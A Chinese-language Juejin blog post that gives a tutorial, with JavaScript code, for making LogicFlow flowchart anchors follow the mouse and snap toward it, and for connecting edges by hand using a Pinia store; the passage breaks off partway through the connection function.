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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">写在开头</h2>
<p>Hey Juejin.cn community! 😀</p>
<p>今是2025年12月28日，距离上一次写文章，已经过去了近两个月的时间。这段时间公司业务实在繁忙，两个月十个周末里有四个都贡献给了加班，就连平日里的工作日也被紧凑的任务填满，忙得几乎脚不沾地。😵</p>
<p>好在一番埋头苦干后，总算能稍稍喘口气了。昨天，小编去爬了广州的南香山🌄，本以为是一座平平无奇的"小山"（低于500米海拔的山，小编基本能无压力速通，嘿嘿），想不到还有惊喜，上山的路是规整的盘山公路，沿着公路一路向上，大半个小时就登顶了；下山时，我们选了一条更野趣的原始小径，有密林、有陡坡，走起来比公路有意思多了，当然，这条路线是有前人走过的，我们跟着网友分享的轨迹，再对照着树上绑着的小红带指路，一路有惊无险地顺利下了山。💯 难受的是，我们得打车回山的另一边拿车😅，但整体来说，这次爬山的体验整体很愉快~</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bce07358cfd3498c8dd740d40eaa73d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qmZ5p-Q5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608726&amp;x-signature=JpAC9mHJ%2BI35acpbRqo2A3QpW00%3D" alt="ad2235428be6eb20735aae76471b9532.jpg" width="43%" loading="lazy"/> <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a25beadd3104b388e2885e04f9ef628~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qmZ5p-Q5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608726&amp;x-signature=awCkhM4Jav8ynGIUvyXwRbOifgg%3D" alt="ca17f1c56d240ea424322b74dadcd4b0.jpg" width="50%" loading="lazy"/></p>
<p>言归正传，最近基于 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdidi%2FLogicFlow" target="_blank" title="https://github.com/didi/LogicFlow" ref="nofollow noopener noreferrer">LogicFlow</a> 开发流程图功能时，做了个<strong>自定义锚点的 "吸附" 效果：鼠标靠近节点时，锚点会自动弹出并灵动跟随鼠标移动</strong>，这个小效果挺有趣的，分享给大家参考，效果如下，请诸君按需食用哈。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2e0f973f7e474159a523a12e5cafdc6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qmZ5p-Q5Lq6:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767608726&amp;x-signature=y39UDHWOUcCplMCxmYdrQncLSnk%3D" alt="122901.gif" loading="lazy"/></p>
<h2 data-id="heading-1">需求背景</h2>
<p>在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fsite.logic-flow.cn%2Ftutorial%2Fget-started" target="_blank" title="https://site.logic-flow.cn/tutorial/get-started" ref="nofollow noopener noreferrer">LogicFlow</a> 中，<strong>锚点</strong>是静态的，固定在节点的上下左右四个位置上，这就导致了两个问题：</p>
<ol>
<li><strong>视觉干扰</strong>：如果一直显示锚点，画面会显得很乱。</li>
<li><strong>交互困难</strong>：用户必须精确点击到锚点才能开始连线，容错率低。</li>
</ol>
<blockquote>
<p>其实...就是产品经理要求要炫酷一点😣，要我说静态的挺好，直观简单。</p>
</blockquote>
<p>我们想要的效果是：</p>
<ul>
<li>平时隐藏锚点，保持界面整洁。</li>
<li>鼠标移入节点区域时，显示锚点。</li>
<li><strong>重点来了</strong>🎯：当鼠标在节点附近移动时，锚点应该像有磁力一样，自动吸附到离鼠标最近的位置（或者跟随鼠标在一定范围内移动），让连线变得随手可得。</li>
</ul>
<h2 data-id="heading-2">具体实现</h2>
<p>要实现这个功能，我们需要深入 LogicFlow 的<a href="https://link.juejin.cn?target=https%3A%2F%2Fsite.logic-flow.cn%2Ftutorial%2Fbasic%2Fnode%23%25E8%2587%25AA%25E5%25AE%259A%25E4%25B9%2589%25E8%258A%2582%25E7%2582%25B9" target="_blank" title="https://site.logic-flow.cn/tutorial/basic/node#%E8%87%AA%E5%AE%9A%E4%B9%89%E8%8A%82%E7%82%B9" ref="nofollow noopener noreferrer">自定义机制</a>。</p>
<p>这次主要围绕到两个文件：</p>
<ul>
<li><code>customNode.js</code>: 自定义节点，用于集成我们写好的超级锚点。</li>
<li><code>customAnchor.js</code>: 核心逻辑，实现锚点的渲染和鼠标跟随逻辑。</li>
</ul>
<h3 data-id="heading-3">第1️⃣步：自定义锚点组件</h3>
<p>首先，我们需要创建一个自定义的锚点渲染函数。这个函数会返回一个 SVG 元素（这里用 LogicFlow内置的 <code>h</code> 函数来创建），并且包含复杂的交互逻辑。</p>
<blockquote>
<p>为什么要返回一个 SVG 元素？</p>
<p>这得说到 LogicFlow 的底层技术选型问题了，可以看看这篇文章：<a href="https://juejin.cn/post/7443804823886446631" target="_blank" title="https://juejin.cn/post/7443804823886446631">传送门</a></p>
</blockquote>
<p>它的核心思想是：创建一个较大的透明容器（<code>container</code>），用来捕获鼠标事件。在这个容器内，我们放一个"小球"（<code>ballGroup</code>），这个小球就是我们看到的锚点。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// customAnchor.js</span>
<span class="hljs-keyword">import</span> { h } <span class="hljs-keyword">from</span> <span class="hljs-string">"@logicflow/core"</span>;

<span class="hljs-comment">// 定义一些常量，方便调整手感</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONTAINER_WIDTH</span> = <span class="hljs-number">72</span>;  <span class="hljs-comment">// 感应区域宽度</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONTAINER_HEIGHT</span> = <span class="hljs-number">80</span>; <span class="hljs-comment">// 感应区域高度</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">BALL_SIZE</span> = <span class="hljs-number">20</span>;        <span class="hljs-comment">// 锚点小球大小</span>

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@name</span> 创建复杂动效锚点
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Object</span>} params 参数对象
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">any</span>} LogicFlow 可用的锚点渲染形状
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createCustomAnchor</span>(<span class="hljs-params">params</span>) {
  <span class="hljs-keyword">const</span> { x, y, side, id, nodeModel, graphModel } = params || {};
  
  <span class="hljs-comment">// 依据左右两侧计算容器左上角 (小编的业务中最多仅只有左右两个锚点)</span>
  <span class="hljs-keyword">const</span> halfW = <span class="hljs-variable constant_">CONTAINER_WIDTH</span> / <span class="hljs-number">2</span>;
  <span class="hljs-comment">// 如果是左侧锚点，容器应该往左偏；右侧同理（可根据自己需求调整，小编的业务是同一时间仅需展示一边的锚点即可）</span>
  <span class="hljs-keyword">const</span> offsetX = side === <span class="hljs-string">"left"</span> ? -halfW : halfW;
  
  <span class="hljs-comment">// 计算透明容器在画布上的绝对坐标</span>
  <span class="hljs-keyword">const</span> containerX = x + offsetX - <span class="hljs-variable constant_">CONTAINER_WIDTH</span> / <span class="hljs-number">2</span>;
  <span class="hljs-keyword">const</span> containerY = y - <span class="hljs-variable constant_">CONTAINER_HEIGHT</span> / <span class="hljs-number">2</span>;

  <span class="hljs-comment">// DOM 引用，用于后续直接操作 DOM 提升性能</span>
  <span class="hljs-keyword">let</span> containerRef = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">let</span> ballGroupRef = <span class="hljs-literal">null</span>;

  <span class="hljs-comment">// 核心逻辑：鼠标移动时，更新小球的位置</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleMouseMove</span>(<span class="hljs-params">ev</span>) {
    <span class="hljs-keyword">if</span> (!containerRef || !ballGroupRef) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// 获取容器相对于视口的位置</span>
    <span class="hljs-keyword">const</span> rect = containerRef.<span class="hljs-title function_">getBoundingClientRect</span>();
    
    <span class="hljs-comment">// 获取鼠标在画布上的位置（这里需要处理一下浏览器兼容性，简单起见用 clientX/Y）</span>
    <span class="hljs-keyword">const</span> clientX = ev.<span class="hljs-property">clientX</span>;
    <span class="hljs-keyword">const</span> clientY = ev.<span class="hljs-property">clientY</span>;
    
    <span class="hljs-comment">// 计算鼠标相对于容器左上角的偏移量</span>
    <span class="hljs-keyword">let</span> relX = clientX - rect.<span class="hljs-property">left</span>; 
    <span class="hljs-keyword">let</span> relY = clientY - rect.<span class="hljs-property">top</span>;
    
    <span class="hljs-comment">// 关键点：限制小球在容器内移动，防止跑出感应区</span>
    relX = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-variable constant_">CONTAINER_WIDTH</span>, relX));
    relY = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-variable constant_">CONTAINER_HEIGHT</span>, relY));
    
    <span class="hljs-comment">// 使用 setAttribute 直接更新 transform，性能最好</span>
    ballGroupRef.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">"transform"</span>, <span class="hljs-string">`translate(<span class="hljs-subst">${containerX + relX}</span>, <span class="hljs-subst">${containerY + relY}</span>)`</span>);
  }
  
  <span class="hljs-comment">// 鼠标移入：变色 + 激活动画</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleMouseEnter</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (!ballGroupRef) <span class="hljs-keyword">return</span>;
    ballGroupRef.<span class="hljs-property">style</span>.<span class="hljs-property">transition</span> = <span class="hljs-string">"transform 140ms ease"</span>;
    <span class="hljs-comment">// 这里可以改变颜色，例如 ballGroupRef.style.color = 'red';</span>
  }

  <span class="hljs-comment">// 鼠标移出：复位</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleMouseLeave</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (!ballGroupRef) <span class="hljs-keyword">return</span>;
    <span class="hljs-comment">// 鼠标离开时，平滑回到容器中心</span>
    ballGroupRef.<span class="hljs-property">style</span>.<span class="hljs-property">transition</span> = <span class="hljs-string">"transform 160ms ease, opacity 320ms ease"</span>;
    
    <span class="hljs-comment">// 计算中心位置</span>
    <span class="hljs-keyword">const</span> centerX = containerX + <span class="hljs-variable constant_">CONTAINER_WIDTH</span> / <span class="hljs-number">2</span>;
    <span class="hljs-keyword">const</span> centerY = containerY + <span class="hljs-variable constant_">CONTAINER_HEIGHT</span> / <span class="hljs-number">2</span>;
    ballGroupRef.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">"transform"</span>, <span class="hljs-string">`translate(<span class="hljs-subst">${centerX}</span>, <span class="hljs-subst">${centerY}</span>)`</span>);
  }

  <span class="hljs-keyword">return</span> <span class="hljs-title function_">h</span>(<span class="hljs-string">"g"</span>, {}, [
    <span class="hljs-comment">// 1. 透明容器：用于扩大感应区域，这就是“吸附”的秘密</span>
    <span class="hljs-title function_">h</span>(<span class="hljs-string">"rect"</span>, {
      <span class="hljs-attr">x</span>: containerX,
      <span class="hljs-attr">y</span>: containerY,
      <span class="hljs-attr">width</span>: <span class="hljs-variable constant_">CONTAINER_WIDTH</span>,
      <span class="hljs-attr">height</span>: <span class="hljs-variable constant_">CONTAINER_HEIGHT</span>,
      <span class="hljs-attr">fill</span>: <span class="hljs-string">"transparent"</span>, <span class="hljs-comment">// 必须是透明但存在的</span>
      <span class="hljs-attr">cursor</span>: <span class="hljs-string">"crosshair"</span>,
      <span class="hljs-attr">onMouseEnter</span>: handleMouseEnter,
      <span class="hljs-attr">onMouseMove</span>: handleMouseMove, <span class="hljs-comment">// 绑定移动事件</span>
      <span class="hljs-attr">onMouseLeave</span>: handleMouseLeave,
      <span class="hljs-comment">// ... 绑定其他事件 ...</span>
    }),
    
    <span class="hljs-comment">// 2. 实际显示的锚点（小球）</span>
    <span class="hljs-title function_">h</span>(<span class="hljs-string">"g"</span>, {
        <span class="hljs-comment">// 初始位置居中</span>
        <span class="hljs-attr">transform</span>: <span class="hljs-string">`translate(<span class="hljs-subst">${containerX + CONTAINER_WIDTH / <span class="hljs-number">2</span>}</span>, <span class="hljs-subst">${containerY + CONTAINER_HEIGHT / <span class="hljs-number">2</span>}</span>)`</span>,
        <span class="hljs-string">"pointer-events"</span>: <span class="hljs-string">"none"</span>, <span class="hljs-comment">// 让鼠标事件穿透到下方的 rect 上</span>
        <span class="hljs-attr">ref</span>: <span class="hljs-function">(<span class="hljs-params">el</span>) =&gt;</span> { ballGroupRef = el; }
      },
      [ 
        <span class="hljs-comment">// 这里画一个圆形和一个加号</span>
        <span class="hljs-title function_">h</span>(<span class="hljs-string">"circle"</span>, { <span class="hljs-attr">r</span>: <span class="hljs-variable constant_">BALL_SIZE</span> / <span class="hljs-number">2</span>, <span class="hljs-attr">stroke</span>: <span class="hljs-string">"currentColor"</span>, <span class="hljs-attr">fill</span>: <span class="hljs-string">"none"</span> }),
        <span class="hljs-title function_">h</span>(<span class="hljs-string">"path"</span>, { <span class="hljs-attr">d</span>: <span class="hljs-string">"M-5 0 L5 0 M0 -5 L0 5"</span>, <span class="hljs-attr">stroke</span>: <span class="hljs-string">"currentColor"</span> })
      ]
    ),
  ]);
}
</code></pre>
<p>这里有个小技巧⏰：我们并没有直接改变 SVG 的 <code>cx/cy</code>，而是通过 <code>transform: translate(...)</code> 来移动整个锚点组，这样性能更好，动画也更流畅。同时，<code>pointer-events: none</code> 确保了鼠标事件始终由底层的透明 <code>rect</code> 触发，避免闪烁。</p>
<h3 data-id="heading-4">第2️⃣步：在自定义节点中使用</h3>
<p>写好了锚点逻辑，接下来要在节点中用起来，咱们需要在自定义节点类中重写 <code>getAnchorShape</code> 方法。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// customNode.js</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">HtmlNode</span>, <span class="hljs-title class_">HtmlNodeModel</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">"@logicflow/core"</span>;
<span class="hljs-keyword">import</span> { createCustomAnchor } <span class="hljs-keyword">from</span> <span class="hljs-string">"./customAnchor"</span>;

<span class="hljs-comment">// 定义节点 View</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomNodeView</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">HtmlNode</span> {
  <span class="hljs-comment">/**
   * <span class="hljs-doctag">@name</span> 自定义节点锚点形状
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">object</span>} anchorData 锚点数据
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">object</span>} 锚点形状对象
   */</span>
  <span class="hljs-title function_">getAnchorShape</span>(<span class="hljs-params">anchorData</span>) {
    <span class="hljs-keyword">const</span> { x, y, name, id } = anchorData;
    
    <span class="hljs-comment">// 简单的业务逻辑：只显示左右两侧的锚点</span>
    <span class="hljs-keyword">const</span> side = name === <span class="hljs-string">"left"</span> ? <span class="hljs-string">"left"</span> : <span class="hljs-string">"right"</span>;
    
    <span class="hljs-comment">// 调用我们刚才写的神器！传入必要的参数</span>
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">createCustomAnchor</span>({
      x,
      y,
      side,
      id,
      <span class="hljs-attr">nodeModel</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">model</span>,
      <span class="hljs-attr">graphModel</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">graphModel</span>,
    });
  }
}

<span class="hljs-comment">// 定义节点 Model</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomNodeModel</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">HtmlNodeModel</span> {
  <span class="hljs-comment">// 定义锚点位置</span>
  <span class="hljs-title function_">getDefaultAnchor</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> { id, width, x, y } = <span class="hljs-variable language_">this</span>;
    <span class="hljs-keyword">return</span> [
      { <span class="hljs-attr">x</span>: x - width / <span class="hljs-number">2</span>, y, <span class="hljs-attr">name</span>: <span class="hljs-string">"left"</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">`<span class="hljs-subst">${id}</span>-L`</span> },
      { <span class="hljs-attr">x</span>: x + width / <span class="hljs-number">2</span>, y, <span class="hljs-attr">name</span>: <span class="hljs-string">"right"</span>, <span class="hljs-attr">id</span>: <span class="hljs-string">`<span class="hljs-subst">${id}</span>-R`</span> },
    ];
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-string">"custom-node"</span>,
  <span class="hljs-attr">view</span>: <span class="hljs-title class_">CustomNodeView</span>,
  <span class="hljs-attr">model</span>: <span class="hljs-title class_">CustomNodeModel</span>,
};
</code></pre>
<h3 data-id="heading-5">第3️⃣步：记录拖拽状态</h3>
<p>在实现“手动连线”之前，我们面临一个关键问题：当我们在目标节点的锚点上松开鼠标时，我们怎么知道<strong>连线是从哪里发起的</strong>？</p>
<p>LogicFlow 的默认行为中，<code>customAnchor</code> 并不知道当前的拖拽上下文。因此，我们需要借助全局状态管理（小编用的是Vue3，所以使用Pinia做的全局数据共享）和 LogicFlow 的事件系统来 "搭桥"。</p>
<p><strong>1. 定义 Store</strong></p>
<p>我们需要一个地方存放“当前正在拖拽的锚点信息”。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// stores/logicFlow.js</span>
<span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span> <span class="hljs-string">"pinia"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useLogicFlowStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">"logicFlow"</span>, {
  <span class="hljs-attr">state</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">draggingInfo</span>: <span class="hljs-literal">null</span>, <span class="hljs-comment">// 存储拖拽中的连线信息</span>
    <span class="hljs-attr">isManualConnected</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 标记是否触发了手动连接</span>
  }),
});
</code></pre>
<p><strong>2. 监听 LogicFlow 事件</strong></p>
<p>在 LogicFlow 初始化的地方，我们需要监听 <code>anchor:dragstart</code> 和 <code>anchor:dragend</code> 事件，实时更新 Store。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { useLogicFlowStore } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/stores/logicFlow"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">initEvents</span>(<span class="hljs-params">lf</span>) {
  <span class="hljs-keyword">const</span> store = <span class="hljs-title function_">useLogicFlowStore</span>();

  <span class="hljs-comment">// 锚点开始拖拽：记录源节点和源锚点信息</span>
  lf.<span class="hljs-title function_">on</span>(<span class="hljs-string">"anchor:dragstart"</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
    store.<span class="hljs-property">draggingInfo</span> = data; 
    store.<span class="hljs-property">isManualConnected</span> = <span class="hljs-literal">false</span>;
  });

  <span class="hljs-comment">// 锚点拖拽结束：清空信息</span>
  lf.<span class="hljs-title function_">on</span>(<span class="hljs-string">"anchor:dragend"</span>, <span class="hljs-function">() =&gt;</span> {
    store.<span class="hljs-property">draggingInfo</span> = <span class="hljs-literal">null</span>;
  });
}
</code></pre>
<p>有了这个铺垫，咱们的自定义锚点就能知道 "谁在连我" 了！😎</p>
<h3 data-id="heading-6">第4️⃣步：手动连线逻辑</h3>
<p>你可能注意到了，锚点位置是“动”的，但 LogicFlow 的连线计算通常基于固定的锚点坐标。如果我们不做处理，可能会出现连线连不上的情况。（其实肯定是连不上的😂）</p>
<p>所以，我们需要在 <code>handleMouseUp</code>（鼠标抬起）时，手动帮 LogicFlow 建立连线。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// customAnchor.js</span>
<span class="hljs-keyword">import</span> { useLogicFlowStore } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/stores/logicFlow"</span>;

  <span class="hljs-comment">// ... 在 createCustomAnchor 内部 ...</span>

  <span class="hljs-keyword">function</span> <span class="hljs-title function_">handleMouseUp</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> store = <span class="hljs-title function_">useLogicFlowStore</span>();
    <span class="hljs-comment">// 获取全局存储的拖拽信息</span>
    <span class="hljs-keyword">const</span> { draggingInfo } = store; 
    
    <span class="hljs-comment">// 尝试手动建立连接</span>
    <span class="hljs-keyword">if</span> (draggingInfo &amp;&amp; graphModel) {
      <span class="hljs-keyword">const</span> sourceNode = draggingInfo.<span class="hljs-property">nodeModel</span>;
      <span class="hljs-keyword">const</span> sourceAnchor = draggingInfo.<span class="hljs-property">data</span>;
      
      <span class="hljs-comment">// 1. 基础校验：避免自连</span>
